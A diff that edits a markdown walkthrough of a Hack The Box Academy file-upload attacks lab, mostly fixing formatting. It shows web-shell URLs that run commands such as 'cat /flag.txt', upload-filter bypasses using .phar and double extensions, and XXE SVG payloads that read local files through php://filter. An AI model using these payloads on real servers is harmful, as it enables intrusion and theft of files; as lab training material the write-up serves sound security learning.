@@ -87,7 +87,7 @@ enter the payload:
 
 Now that the payload is ready in the 'webshell.file' – lets enter the target
 server website in the browser URL:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 ![Figure 1.1 — Lab execution and output verification (Page 1)](/assets/images/posts/htb-academy/file-upload-attacks/p001_01.jpg)
 *_Figure 1.1 — Lab execution and output verification (Page 1)_*
@@ -107,8 +107,7 @@ File sucsessfully uploaded. Attempting to download the file will reveal to us:
 
 That the file is located in '/uploads/ path folder .
 Now lets to to the URL link:
-http://<target-IP>:<target-
-port>/uploads/webshell?cmd=hostname
+`http://<target-IP>:<target-port>/uploads/webshell?cmd=hostname`
 
 
 The answer is the second word.
@@ -137,8 +136,7 @@ The answer is the second word.
 #### Technical Methodology & Exploit Execution:
 
 continuing from the previous section – we enter the URL:
-http://<target-IP>:<target-port>/uploads/webshell?cmd=cat
-/flag.txt
+`http://<target-IP>:<target-port>/uploads/webshell.php?cmd=cat%20/flag.txt`
 
 ![Figure 3.1 — Lab execution and output verification (Page 3)](/assets/images/posts/htb-academy/file-upload-attacks/p003_01.jpg)
 *_Figure 3.1 — Lab execution and output verification (Page 3)_*
@@ -155,7 +153,7 @@ http://<target-IP>:<target-port>/uploads/webshell?cmd=cat
 #### Technical Methodology & Exploit Execution:
 
 Method 1: lets enter the target server website in the browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 and attempt to upload the same webshell from previous sections:
 
 Only images are allowed.
@@ -179,14 +177,13 @@ developer tools (it will not be shown on the web page itself)
 
 As we can see, the webshell.php is located at '/profile_images' – there we will
 go to get the flag:
-http://<target-IP>:<target-
-port>/profile_images/webshell.php?cmd=cat /flag.txt
+`http://<target-IP>:<target-port>/profile_images/webshell.php?cmd=cat /flag.txt`
 
 
 
 Method 2: we will use burpsuite to avoid the browser validation all together.
 Lets open burpsuite, and go to the website from the burpsuite browser.
-However in the browser, we will uploade legitimate image:
+However in the browser, we will upload a legitimate image:
 
 ![Figure 5.1 — Lab execution and output verification (Page 5)](/assets/images/posts/htb-academy/file-upload-attacks/p005_01.jpg)
 *_Figure 5.1 — Lab execution and output verification (Page 5)_*
@@ -210,8 +207,7 @@ And forward.
 Now the webshell.php should be uploaded on the servers. So lets set the
 interceptor off. And go again to the same URL path to retrieve the '/flag.txt' via
 the webshell:
-http://<target-IP>:<target-
-port>/profile_images/webshell.php?cmd=cat /flag.txt
+`http://<target-IP>:<target-port>/profile_images/webshell.php?cmd=cat /flag.txt`
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/file-upload-attacks/p006_01.jpg)
 *_Figure 6.1 — Lab execution and output verification (Page 6)_*
@@ -243,7 +239,7 @@ and supports php execution.
 IT DOES NOT CREATES THE WEBSHELL FOR US.
 
 Once downloaded to the pwnbox: we will first modify the TARGET_SERVER
-variable with the target IP and port (from '<target-IP>:<target-port>')
+variable with the target IP and port (from '`<target-IP>`:`<target-port>`')
 
 Next, we will grant the .sh file execution permissions:
 ```bash
@@ -278,8 +274,7 @@ Now the script is ready to run. But we do need wordlist first, we will use the
 'web-extensions.txt' wordlist, in the pwnbox it is located at
 '/usr/share/seclists/Discovery/Web-Content/web-extensions.txt'.
 Lets copy it to our current working directory:
-cp /usr/share/seclists/Discovery/Web-Content/web-
-extensions.txt web-extensions.txt
+cp /usr/share/seclists/Discovery/Web-Content/web-extensions.txt web-extensions.txt
 
 
 *note – the wordlist 'web-extensions.txt' is hardcoded in the script. *
@@ -312,8 +307,7 @@ Now, lets use the burpsuite repeater to upload the webshell script:
 As 'webshell.phar' to the server:
 
 All we have to do now, is to go in the browser (normal or burpsuite) to
-http://<target-IP>:<target-
-port>/profile_images/webshell.phar?cmd=cat /flag.txt
+`http://<target-IP>:<target-port>/profile_images/webshell.phar?cmd=cat /flag.txt`
 
 ![Figure 9.1 — Lab execution and output verification (Page 9)](/assets/images/posts/htb-academy/file-upload-attacks/p009_01.jpg)
 *_Figure 9.1 — Lab execution and output verification (Page 9)_*
@@ -390,9 +384,9 @@ with the 'double_ext_maker.sh' . *
 Lets grant the script permissions, run it, and take a peek in the output file:
 ```bash
 chmod u+x double_ext_maker.sh;
-```
 ./double_ext_maker.sh;
 head -8 web-extensions-double.txt;
+```
 
 
 
@@ -519,9 +513,11 @@ We send the intercepted request to the burpsuite repeater, and remove all of
 the xml section (the green text).
 
 We will replace the removed original image content, with this xml payload:
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
 <svg>&xxe;</svg>
+```
 
 
 And send:
@@ -539,7 +535,7 @@ And send:
 File successfully uploaded.
 
 Now, lets intercept the main page load request and response:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 And enter 'Forward' (or send to repeater and continue from there):
@@ -569,10 +565,11 @@ page, only in source code)
 
 to read 'upload.php' we will have to use the base64 encoded version
 of the payload:
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [ <!ENTITY xxe SYSTEM
-"php://filter/convert.base64-encode/resource=upload.php"> ]>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
 <svg>&xxe;</svg>
+```
 
 
 *the reason we need to encode the resource file, is because the usual one
@@ -606,7 +603,7 @@ Lets decode:
 #### Technical Methodology & Exploit Execution:
 
 first lets enter the URL:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 in the burpsuite browser (interceptor off)
 
 This is some nice website.. lets go to 'Contact Us':
@@ -669,12 +666,13 @@ we can see on the first screenshot, line 5 that the request is xml:
 
 So lets try to obtain
 
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-<!ENTITY xxe SYSTEM "php://filter/convert.base64-
-encode/resource=upload.php">
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
 ]>
 <svg>&xxe;</svg>
+```
 
 ![Figure 23.1 — Lab execution and output verification (Page 23)](/assets/images/posts/htb-academy/file-upload-attacks/p023_01.png)
 *_Figure 23.1 — Lab execution and output verification (Page 23)_*
@@ -715,16 +713,14 @@ some size check and image upload.
 ### Lets check this
 
 Lets start with the file storage handler – we can see it's a concatenation of
-current date (format YYMMDD)_<filename>.png – meaning for the day of
+current date (format YYMMDD)_`<filename>`.png – meaning for the day of
 writing this writeup – September 14, 2024; and the original filename
 jonsnow.png – the file will be stored at stored at 'user_feedback_submissions'
 folder (line 5) under the name '240914_jonsnow.png'.
 Lets check this:
-http://<target-IP>:<target-
-port>/contact/user_feedback_submissions/<current-
-date>_jonsnow.png
-*note – the '<current-date>' corespondes with the afromentioned date of
-today, which in thie case is '240914' . *
+`http://<target-IP>:<target-port>/contact/user_feedback_submissions/<current-date>_jonsnow.png`
+
+*Note: the `<current-date>` corresponds with the aforementioned date of today, which in this case is '240914'.*
 
 Here is the image stored. Using this method we can get to the webshell we will
 upload.
@@ -756,7 +752,7 @@ The extensions that will be accepted by the white list format are:
 '<any non-empty string>.<2 or 3 letters>g' – it includes extensions such as
 '.png', '.jpeg', '.jpg' (and any other 3 or 4 letters extensions which end with 'g').
 
-If we combine the 2 lists together – we will notice that '<filename>.phar .png' –
+If we combine the 2 lists together – we will notice that '`<filename>`.phar .png' –
 will both is whitelisted (as it ends with '.png'), and not blacklisted.
 We can use that format to upload outwebshell. Lets make a slight modification
 to the 'jonsnow.png' upload request:
@@ -778,8 +774,7 @@ page much more easier to read, of course I kept the header and footer.
 
 #### Technical Methodology & Exploit Execution:
 
-http://<target-IP>:<target-
-port>/contact/user_feedback_submissions/<current-
+`http://<target-IP>:<target-port>/contact/user_feedback_submissions/<current-`
 date>_jonsnow.phar.png?cmd=id
 
 
@@ -787,15 +782,13 @@ Success! We got the 'id', the webshell works.
 
 Now lets enter the command 'ls /' to see what files are in the root ('/')
 directory:
-http://<target-IP>:<target-
-port>/contact/user_feedback_submissions/<current-
+`http://<target-IP>:<target-port>/contact/user_feedback_submissions/<current-`
 date>_jonsnow.phar.png?cmd=ls /
 
 
 
 We can see the flag name there, lets get its content:
-http://<target-IP>:<target-
-port>/contact/user_feedback_submissions/<current-
+`http://<target-IP>:<target-port>/contact/user_feedback_submissions/<current-`
 date>_jonsnow.phar.png?cmd=cat%20/flag_2b8f1d2da162d8c44b369
 6a1dd8a91c9.txt
 
